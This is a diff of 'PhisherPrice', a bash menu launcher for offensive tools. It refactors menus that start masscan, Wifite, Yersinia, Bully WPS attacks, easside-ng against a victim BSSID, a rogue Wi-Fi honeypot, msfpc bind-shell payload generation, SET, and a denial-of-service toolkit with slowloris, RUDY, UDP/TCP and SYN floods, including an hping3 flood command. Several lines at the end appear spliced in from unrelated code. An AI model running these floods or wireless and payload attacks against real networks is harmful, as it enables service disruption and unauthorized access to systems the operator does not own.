- /  \ /  \\__  \  /  ___/\_____  \_/ ___\\__  \  /    \ 
-/    Y    \/ __ \_\___ \ /        \  \___ / __ \|   |  \
-\____|__  (____  /____  >_______  /\___  >____  /___|  /
-        \/     \/     \/        \/     \/     \/     \/ \e[1;34m
-'  
-echo -e "\nNetwork Port Scanner with Masscan"
-echo -e "---------------------------------\n"
-echo "Enter IP (e.g. 192.168.1.0):"
-read massip
-echo "Enter Port Range (e.g. 24 or 80):"
-read massrange
-
-clear
-
-echo -e "Starting port scan...\n"
-
-if masscan -p22,21,80,445,443 $massip/$massrange; then
-  echo -e "\nPort scan complete.\n"
-else
-  clear
-  echo -e "\nPort scan failed.\n"
-fi
-
-read -p "Press Enter to continue."
-
-elif [ "$x" == "$sube" ]; then                    #Sub-Option-e
-clear
-echo -e "\n**************************************************"
-echo "******     Wifite Launcher     ******"
-echo -e "**************************************************\n"
-
-read -p "Are you sure you want to start Wifite? (y/n): " wifiwanger
-
-if [[ $wifiwanger =~ ^[Yy]$ ]]; then
-  clear
-  echo -e "\n**************************************************"
-  echo "******     Starting Wifite     ******"
-  echo -e "**************************************************\n"
-  
-  wifite --kill-all
-else
-  clear
-  echo -e "\n**************************************************"
-  echo "******     Operation cancelled     ******"
-  echo -e "**************************************************\n"
-fi
-
-read -p "Press Enter to continue."
-
-elif [ "$x" == "$yersin" ]; then                    #Sub-Option-e
-clear
-echo -e "\n**************************************************"
-echo "******     Yersinia Launcher     ******"
-echo -e "**************************************************\n"
-
-read -p "Are you sure you want to start Yersinia? (y/n): " siryessir
-
-if [[ $siryessir =~ ^[Yy]$ ]]; then
-  clear
-  echo -e "\n**************************************************"
-  echo "******     Starting Yersinia     ******"
-  echo -e "**************************************************\n"
-
-  yersinia -G
-else
-  clear
-  echo -e "\n**************************************************"
-  echo "******     Operation cancelled     ******"
-  echo -e "**************************************************\n"
-fi
-
-read -p "Press Enter to continue."
-
-elif [ "$x" == "$bully" ]; then                    #YouLilBully
-clear
-echo -e "\n**************************************************"
-echo "******     Wi-Fi Bully     ******"
-echo -e "**************************************************\n"
-
-read -p "Enter the ESSID of the network you want to bully (e.g. 6F36E6): " essid
-if [[ ! $essid =~ ^[a-fA-F0-9]{6}$ ]]; then
-  echo -e "\nInvalid ESSID. Please enter a valid 6-character hexadecimal string."
-  read -p "Press Enter to continue."
-fi
-
-read -p "Which Wi-Fi interface are you using? (wlan0mon/wlan1mon): " interface
-if [[ ! $interface =~ ^(wlan0mon|wlan1mon)$ ]]; then
-  echo -e "\nInvalid interface name. Please enter either wlan0mon or wlan1mon."
-  read -p "Press Enter to continue."
-fi
-
-read -p "Are you sure you want to bully network with ESSID $essid using interface $interface? (y/n): " confirm
-if [[ ! $confirm =~ ^[Yy]$ ]]; then
-  echo -e "\nOperation cancelled."
-  read -p "Press Enter to continue."
-fi
-
-clear
-echo -e "\n**************************************************"
-echo "******     Starting Bully     ******"
-echo -e "**************************************************\n"
-bully -e $essid $interface
-
-if [[ $? -ne 0 ]]; then
-  clear
-  echo -e "\nBully failed. Please make sure you have the necessary tools installed and try again."
-  read -p "Press Enter to continue."
-fi
-
-echo -e "\n**************************************************"
-echo "******     Bullying complete     ******"
-echo -e "**************************************************\n"
-
-read -p "Press Enter to continue."
-
-elif [ "$x" == "$blueranger" ]; then                          #BlueRanger
-clear
-echo -e "\n**************************************************"
-echo "******     Fern Wifi-Cracker Launcher     ******"
-echo -e "**************************************************\n"
-
-read -p "Are you sure you want to start Fern Wifi-Cracker? (y/n): " start_fern
-
-if [[ $start_fern =~ ^[Yy]$ ]]; then
-  clear
-  echo -e "\n**************************************************"
-  echo "******     Starting Fern Wifi-Cracker     ******"
-  echo -e "**************************************************\n"
-
-  fern-wifi-cracker
-else
-  clear
-  echo -e "\n**************************************************"
-  echo "******     Operation cancelled     ******"
-  echo -e "**************************************************\n"
-fi
-
-read -p "Press Enter to continue."
-
-elif [ "$x" == "$eeng" ]; then                          #BlueRanger
-clear
-echo -e "\n**************************************************"
-echo "******     Easside-NG Launcher     ******"
-echo -e "**************************************************\n"
-
-read -p "Are you sure you want to start Easside-NG? (y/n): " easside_choice
-
-if [[ $easside_choice =~ ^[Yy]$ ]]; then
-  echo "Enter victim's BSSID (e.g. de:ad:be:ef:ca:fe): "
-  read vbssid
-  
-  echo "Enter source MAC address: "
-  read srcmac
-  
-  echo "Enter Buddy-ng IP address (mandatory), usually 127.0.0.1: "
-  read srcip
-  
-  echo "Enter your interface (e.g. wlan0mon or wlan1mon): "
-  read easymc
-  
-  echo "Enter the channel ID (e.g. 6): "
-  read easychan
-  
-  clear
-  
-  echo -e "\n**************************************************"
-  echo "******     Starting Fern Easside-NG     ******"
-  echo -e "**************************************************\n"
-  
-  xterm -e "buddy-ng" &
-  sleep 1
-  
-  easside-ng -v $vbssid -m $srcmac -s $srcip -f $easymc -c $easychan
-  
-else
-  
-  echo -e "\n**************************************************"
-  echo "******     Operation cancelled     ******"
-  echo -e "**************************************************\n"
-fi
-
-read -p "Press Enter to continue."
-
-elif [ "$x" == "$kissmet1" ]; then                          #kissmet
-clear
-echo -e "\n**************************************************"
-echo "******        Kismet Launcher        ******"
-echo -e "**************************************************\n"
-
-read -p "Are you sure you want to start Kismet? (y/n): " kissmebaby
-
-if [[ $kissmebaby =~ ^[Yy]$ ]]; then
-  clear
-  echo -e "\n**************************************************"
-  echo "******        Starting Kismet        ******"
-  echo "******  To Stop Kismet CTRL + C     ******"
-  echo -e "**************************************************\n"
-  
-  kismet
-else
-  clear
-  echo -e "\n**************************************************"
-  echo "******     Operation cancelled     ******"
-  echo -e "**************************************************\n"
-fi
-
-read -p "Press Enter to continue."
-
-elif [ "$x" == "$whoney" ]; then                          #routersploit
-clear
-echo "Are you sure you want to start HoneyPot?"
-read hpot
-
-if [[ $hpot =~ ^[Yy]$ ]]; then
-  echo "Enter a wifi name of your choice: " 
-  read wifiname
-  echo "Enter wifi channel you wish to broadcast on (e.g. 6 or 11): " 
-  read wifichannel
-  echo "Enter your Interface (e.g. wlan0 or wlan1): " 
-  read hpotif
-
-  clear
-  echo -e "\n**************************************************"
-  echo "******        Starting HoneyPot...      ******"
-  echo -e "**************************************************\n"
-
-  airmon-ng check kill
-  wifi-honey $wifiname $wifichannel $hpotif
-
-  read -p "Press Enter to disable monitor mode and continue." confirm
-
-  if [[ $confirm =~ ^[Yy]$ ]]; then
-    sudo service network-manager restart
-  else
-    echo -e "\n**************************************************"
-    echo "******  Monitor mode has not been disabled. ******"
-    echo -e "**************************************************\n"
-  fi
-
-  read -p "Press Enter to continue."
-else
-  clear
-  echo -e "\n**************************************************"
-  echo "******        Operation cancelled        ******"
-  echo -e "**************************************************\n"
-fi
-
-read -p "Press Enter to continue."
-
-
-elif [ "$x" == "$subdosm" ]; then                          #DOS
+        ;;
+      b|B)
+        return
+        ;;
+        q|Q)
+        clear
+        echo "Exiting PhisherPrice. Goodbye!"
+        exit 0
+        ;;
+      *)
+        echo "Invalid option: $choice"
+        ;;
+    esac
+    echo ""
+    read -p "Press enter to continue..."
+  done
+}
+dostoolkit() {
+  while true
+  do
 clear
 	echo -e "${banner}"
 	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                      
@@ -3013,19 +3091,15 @@ Denial-Of-Service Toolkit
 (3) UDP/TCP Flood Attack
 (4) R-U-Dead-Yet Attack
 (5) SYN flood attack
-CTRL + C To Exit
-Press ENTER To Go To Main Menu
-'
-vuln2dos='1'
-slowdos='2'
-udpdos='3'
-rudydos='4'
-synner='5'
 
+Press q/Q To Exit
+Press b/B To Go To Back
+'
 echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"DoS-Toolkit$Blue]:"
-read -e -p" └─────► " x
-if [ "$x" == "$vuln2dos" ]; then                    #slowloris
-clear
+read -r -p" └─────► " choice
+    case $choice in
+      1)
+        clear
 # Prompt user for hostname or IP address
 echo "Enter a hostname or IP address to check for vulnerabilities:"
 read -e target
@@ -3061,9 +3135,9 @@ if hping3 -c 10000 -d 120 -S -w 64 --flood "${target}" 2>&1 | grep -q "10000 pac
 else
     echo "SYN Flood attack not detected."
 fi
-read
-elif [ "$x" == "$slowdos" ]; then                    #slowloris
-    clear
+        ;;
+      2)
+            clear
     echo "Slowloris Type Attack"
     read -e -p "Enter the hostname or IP address of the target: " host
     read -e -p "Enter the port number of the target: " port
@@ -3106,16 +3180,9 @@ elif [ "$x" == "$slowdos" ]; then                    #slowloris
     done
 
     echo "Slowloris attack on $host:$port finished."
-
-fi
-
-read
-else
-n
-fi
-if [ "$x" == "$udpdos" ]; then                    #udp-flood
-
-clear
+        ;;
+      3)
+        clear
 echo "UDP/TCP Flood Attack with Multithreading and Randomization"
 echo "Example: 10.0.0.1 80 1024 60 50"
 read -p "IP" ip
@@ -3166,13 +3233,9 @@ for ((i=0;i<$threads;i++)); do
 done
 
 echo "Attack finished."
-
-read
-else
-n
-fi
-if [ "$x" == "$rudydos" ]; then                    #rudy
-clear
+        ;;
+      4)
+        clear
 echo "R-U-Dead-Yet (RUDY) Type Attack"
 echo "Example: example.com 80 1000 60"
 echo "Host"
@@ -3212,11 +3275,10 @@ for ((i=0; i<packet_count; i++)); do
 done
 
 echo "Attack finished."
-
-read
-
-elif [ "$x" == "$synner" ]; then                    #syn flood
-echo "SYN flood attack"
+        ;;
+      5)
+        clear
+        echo "SYN flood attack"
 echo "Example: example.com 80"
 echo "Host"
 read -e host
@@ -3246,11 +3308,27 @@ for ((i=1;i<=$packets;i++)); do
 done
 
 echo "Attack finished."
-read
-else
-n
-fi
-elif [ "$x" == "$option5" ]; then                          #Option5
+        ;;
+      b|B)
+        return
+        ;;
+        q|Q)
+        clear
+        echo "Exiting PhisherPrice. Goodbye!"
+        exit 0
+        ;;
+      *)
+        echo "Invalid option: $choice"
+        ;;
+    esac
+    echo ""
+    read -p "Press enter to continue..."
+  done
+}
+# Submenu 5 function
+submenu5() {
+  while true
+  do
 clear
 	echo -e "${banner}"
 	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                      
@@ -3271,127 +3349,96 @@ Create Your Own Xsploit
 (11) Powershell
 (12) Python
 (13) Tomcat
-CTRL + C To Exit
-Press ENTER To Go To Main Menu
+
+Press q/Q To Exit
+Press b/B To Go To Back
 '
-cyouro1='1'
-cyouro2='2'
-cyouro3='3'
-cyouro4='4'
-cyouro5='5'
-cyouro6='6'
-cyouro7='7'
-cyouro8='8'
-cyouro9='9'
-cyouro10='10'
-cyouro11='11'
-cyouro12='12'
-cyouro13='13'
-
-wait
 echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"CYO Xsploit$Blue]:"
-read -e -p" └─────► " x
-
-if [ "$x" == "$cyouro1" ]; then                    #cyouro-Option-1
+read -r -p" └─────► " choice
+    case $choice in
+      1)
 clear
 
 msfpc windows bind 5555 verbose
-
-read
-
-elif [ "$x" == "$cyouro2" ]; then                    #cyouro-Option-2
-
+        ;;
+      2)
 clear
 msfpc linux bind 5555 verbose
-
-read
-
-elif [ "$x" == "$cyouro3" ]; then                    #cyouro-Option-3
+        ;;
+      3)
 clear
 
 msfpc osx bind 5555 verbose
-
-read
-
-elif [ "$x" == "$cyouro4" ]; then                    #cyouro-Option-4
-
+        ;;
+      4)
 clear
 
 msfpc apk bind 5555 verbose
-
-read
-
-elif [ "$x" == "$cyouro5" ]; then                    #cyouro-Option-5
+        ;;
+      5)
 clear
 
 msfpc asp bind 5555 verbose
-
-read
-
-elif [ "$x" == "$cyouro6" ]; then                    #cyouro-Option-6
+        ;;
+      6)
 clear
 
 msfpc aspx bind 5555 verbose
-
-read
-
-elif [ "$x" == "$cyouro7" ]; then                    #cyouro-Option-7
+        ;;
+      7)
 clear
 
 msfpc bash bind 5555 verbose
-
-read
-
-elif [ "$x" == "$cyouro8" ]; then                    #cyouro-Option-8
+        ;;
+      8)
 clear
 
 msfpc java bind 5555 verbose
-
-read
-
-elif [ "$x" == "$cyouro9" ]; then                    #cyouro-Option-9
+        ;;
+      9)
 clear
 
 msfpc perl bind 5555 verbose
-
-read
-
-elif [ "$x" == "$cyouro10" ]; then                    #cyouro-Option-10
+        ;;
+      10)
 clear
 
 msfpc php bind 5555 verbose
-
-read
-
-elif [ "$x" == "$cyouro11" ]; then                    #cyouro-Option-11
+        ;;
+      11)
 clear
 
 msfpc powershell bind 5555 verbose
-
-read
-
-elif [ "$x" == "$cyouro12" ]; then                    #cyouro-Option-12
+        ;;
+      12)
 clear
 
 msfpc python bind 5555 verbose
-
-read
-
-elif [ "$x" == "$cyouro13" ]; then                    #cyouro-Option-13
+        ;;
+      13)
 clear
-
 msfpc tomcat bind 5555 verbose
-
-read
-
-else 
-
-n
-
-
-fi
-
-elif [ "$x" == "$option6" ]; then                          #Option6
+        ;;
+      b|B)
+        return
+        ;;
+        q|Q)
+        clear
+        echo "Exiting PhisherPrice. Goodbye!"
+        exit 0
+        ;;
+      *)
+        echo "Invalid option: $choice"
+        ;;
+    esac
+    echo ""
+    read -p "Press enter to continue..."
+  done
+}
+# Submenu 6 function
+submenu6() {
+  while true
+  do
 clear
 echo -e '\e[1;33m
 ///,        ////
@@ -3400,7 +3447,7 @@ echo -e '\e[1;33m
   \_  /_/   /.
    \__/_   <    AutoExif Tool
    /<<< \_\_  PhisherPrice
-  /,)^>>_._ \ Version Alpha 
+  /,)^>>_._ \ 
   (/   \\ /\\\
        // //```
 ======((`((====\e[1;34m
@@ -3418,26 +3465,16 @@ echo -e '\e[1;31m Exif Tool AutoMated For Easy Conveinience
 (7) Extract GPS from AVCH video 
 (8) Extract Info From Thumbnail
 (9) Wipe Photoshop MetaData
-(i) Help
-CTRL + C To Exit
+(h/H) Help
+
+Press q/Q To Exit
+Press b/B To Go To Back
 '
-autoexiftool1='1'
-autoexiftool2='2'
-autoexiftool3='3'
-autoexiftool4='4'
-autoexiftool5='5'
-autoexiftool6='6'
-autoexiftool7='7'
-autoexiftool8='8'
-autoexiftool9='9'
-help='i'
-
-
-
 echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"AutoExif$Blue]:"
-read -e -p" └─────► " x
-
-if [ "$x" == "$autoexiftool1" ]; then                    #readmetadata basic
+read -r -p" └─────► " choice
+    case $choice in
+      1)
+      clear
 echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
 read -e meta1
 echo -e '
@@ -3451,14 +3488,10 @@ exiftool $meta1
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!! Data Extracted using AutoExif !!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-Press ENTER To Go Back To The Main Menu
-'
-
-read
-
-
-elif [ "$x" == "$autoexiftool2" ]; then                          #readmetadatadeep
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
+        ;;
+      2)
+      clear
 echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
 read -e mdeep
 echo -e '
@@ -3472,13 +3505,10 @@ cat $mdeep | exiftool -
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!! Data Extracted using AutoExif !!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-Press ENTER To Go Back To The Main Menu
-'
-
-read
-
-elif [ "$x" == "$autoexiftool3" ]; then                          #webextract
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
+        ;;
+      3)
+      clear
 echo "enter image location for eg: http://a.domain.com/bigfile.jpg"
 read -e exifop1host
 echo -e '
@@ -3492,13 +3522,10 @@ curl -s $exifop1host | exiftool -fast -
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!! Data Extracted using AutoExif !!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-Press ENTER To Go Back To The Main Menu
-'
-
-read
-
-elif [ "$x" == "$autoexiftool4" ]; then                          #autoexiftool4
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
+        ;;
+      4)
+      clear
 echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
 read -e exifop4
 echo -e '
@@ -3512,34 +3539,26 @@ exiftool -all= --jfif:all $exifop4
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!!   Data Wiped Using AutoExif   !!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-Press ENTER To Go Back To The Main Menu
-'
-
-read
-
-
-elif [ "$x" == "$autoexiftool5" ]; then                          #AVCHextract
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
+        ;;
+      5)
+      clear
 echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
 read -e exifop5
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!!        Wiping GPS Data        !!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-'
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
 
 exiftool -gps:all= $exifop5
 
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!!   Data Wiped Using AutoExif   !!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-Press ENTER To Go Back To The Main Menu
-'
-
-read
-
-elif [ "$x" == "$autoexiftool6" ]; then                          #autoexiftool6
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
+        ;;
+      6)
+      clear
 echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
 read -e exifop6
 echo -e '
@@ -3553,13 +3572,10 @@ exiftool -all= -comment='Protected By NULLSecurity Team' $exifop6
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!!! Data Replaced Using AutoExif !!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-Press ENTER To Go Back To The Main Menu
-'
-
-read
-
-elif [ "$x" == "$autoexiftool7" ]; then                          #autoexiftool7
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
+        ;;
+      7)
+      clear
 echo "enter image name followed by its file type eg: /home/username/Videos/lulz.m2ts"
 read -e avch
 echo -e '
@@ -3574,15 +3590,10 @@ exiftool -ee -p '$gpslatitude, $gpslongitude, $gpstimestamp' $avch
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!! Data Extracted using AutoExif !!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-Press ENTER To Go Back To The Main Menu
-'
-
-read
-
-
-
-elif [ "$x" == "$autoexiftool8" ]; then                          #AVCHExtract
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
+        ;;
+      8)
+      clear
 echo "enter image name followed by its file type eg: /home/username/pictures/lulz.png"
 read -e exif8
 echo -e '
@@ -3597,16 +3608,11 @@ exiftool $exif8 -thumbnailimage -b | exiftool -
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!! Data Extracted using AutoExif !!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-Press ENTER To Go Back To The Main Menu
-'
-
-read
-
-
-elif [ "$x" == "$autoexiftool9" ]; then                          #autoexiftool9
-
-echo -e '
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
+        ;;
+      9)
+      clear
+      echo -e '
 Delete Photoshop meta information from an image (note that the Photoshop informatio nalso includes IPTC).
 enter image name followed by its file type eg: /home/username/pictures/lulz.jpg
 '
@@ -3623,16 +3629,9 @@ exiftool -Photoshop:All= $psd
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!! Data Extracted using AutoExif !!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-Press ENTER To Go Back To The Main Menu
-'
-
-read
-
-
-
-elif [ "$x" == "$help" ]; then                          #autoexiftool10
-
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
+        ;;
+      h|H)
 clear
 echo -e '\e[1;33m
 \e[0m
@@ -3645,134 +3644,21 @@ For eg: instead of /home/username/Pictures/lulz.png
 I would just type : lulz.png
 '
 read -p "Press Enter to continue."
-
-
-else 
-
-n
-
-
-fi
-
-
-elif [ "$x" == "$option7" ]; then                          #Option7
-clear
-echo "Are you sure you want to start SE Toolkit?"
-read -p "Press Y to confirm or any other key to cancel." confirm
-
-if [[ "$confirm" =~ ^([yY][eE][sS]|[yY])$ ]]; then
-  clear
-  echo -e "\n**************************************************"
-  echo "******  Starting Social Engineering Toolkit... ******"
-  echo -e "**************************************************\n"
-  
-  if sudo setoolkit; then
-    clear
-    echo -e "\n**************************************************"
-    echo "******          SET has been closed         ******"
-    echo -e "**************************************************\n"
-  else
-    clear
-    echo -e "\n**************************************************"
-    echo "******        Error running SET...         ******"
-    echo "******  Please check your installation.   ******"
-    echo -e "**************************************************\n"
-  fi
-
-else
-  clear
-  echo -e "\n**************************************************"
-  echo "******        Operation cancelled.         ******"
-  echo -e "**************************************************\n"
-fi
-
-read -p "Press Enter to continue." 
-
-elif [ "$x" == "$option8" ]; then                          #Option9
-clear
-
-echo "Are you sure you want to start Th3inspector?"
-read -p "Press Y to confirm or any other key to cancel." confirm
-
-if [[ "$confirm" =~ ^([yY][eE][sS]|[yY])$ ]]; then
-    clear
-    echo -e '\n**************************************************'
-    echo "******      Loading Th3inspector...     ******"
-    echo -e '**************************************************\n'
-
-    Th3inspector
-
-    clear
-    echo -e '\n**************************************************'
-    echo "******    Th3inspector has been closed.  ******"
-    echo -e '**************************************************\n'
-else
-    clear
-    echo -e '\n**************************************************'
-    echo "******         Operation cancelled.        ******"
-    echo -e '**************************************************\n'
-fi
-
-read -p "Press Enter to continue."
-elif [ "$x" == "$update" ]; then
-    clear
-    echo "Updating Phisherprice..."
-    REPO_URL="https://github.com/sircryptic/phisherprice.git"
-    INSTALL_DIR="/usr/local/bin/phisherprice"
-
-    echo "Cloning latest release..."
-    git clone $REPO_URL $INSTALL_DIR.new || { echo "Failed to clone latest release"; exit 1; }
-
-    if [ -d $INSTALL_DIR.old ]; then
-        echo "Removing old version..."
-        sudo rm -rf $INSTALL_DIR.old || { echo "Failed to remove old version"; exit 1; }
-    fi
-
-    if [ -d $INSTALL_DIR ]; then
-        echo "Backing up current version..."
-        sudo mv $INSTALL_DIR $INSTALL_DIR.old || { echo "Failed to move current version to backup"; exit 1; }
-    fi
-
-    echo "Installing latest version..."
-    sudo mv $INSTALL_DIR.new $INSTALL_DIR || { echo "Failed to install latest version"; exit 1; }
-
-    echo "Making $INSTALL_DIR/phisherprice.sh executable..."
-    sudo chmod +x $INSTALL_DIR/phisherprice.sh || { echo "Failed to make phisherprice.sh executable"; exit 1; }
-
-    echo "Creating symbolic link for phisherprice.sh as pp..."
-    if [ -L /usr/local/bin/pp ]; then
-        echo "Removing old symbolic link..."
-        sudo rm /usr/local/bin/pp || { echo "Failed to remove old symbolic link"; exit 1; }
-    fi
-    sudo ln -s $INSTALL_DIR/phisherprice.sh /usr/local/bin/pp || { echo "Failed to create symbolic link"; exit 1; }
-
-    echo "Update complete!"
-
-    echo "Restarting Phisherprice (now accessible via 'pp')..."
-    sudo pp || { echo "Failed to restart Phisherprice"; exit 1; }
-elif [ "$x" == "$contact" ]; then                 #CONTACTME                    
-
-clear
-
-echo -e "\e[1;33m\nIf you have any issues, feel free to file a bug report on Git.\e[0m\n"
-echo -e "\e[1;34mI would personally like to thank \e[1;35mJack \e[1;34mover at \e[1;32mKali Hacking Community Discord Server\e[1;34m for being my motivation to keep making this tool. Sadly, this tool is no longer going to be updated much longer, and the original KHC community sank. Farewell to all those I personally knew.\nI would also like to thank \e[1;35mKiera<3 \e[1;34mover @KCH \e[1;34mfor making me aware of bugs. Without people like this, I probably would have been oblivious. So thank you once again to all those that made this possible and gave me inspiration.\n- \e[1;31mSirCryptic \e[1;34m\n"
-read -p "Press Enter to continue."
-
-else 
-
-n
-
-fi
-
-done
-history -w
-clear
-	exit 1
-	fi
-	if [[ -z "$dldir" ]]; then
-		dldir=OpenCV
-	fi
-	if ! sudo true; then
-		exit 1
-	fi
-	set -e
+        ;;
+      b|B)
+        return
+        ;;
+        q|Q)
+        clear
+        echo "Exiting PhisherPrice. Goodbye!"
+        exit 0
+        ;;
+      *)
+        echo "Invalid option: $choice"
+        ;;
+    esac
+    echo ""
+    read -p "Press enter to continue..."
+  done
+}
+main_menu
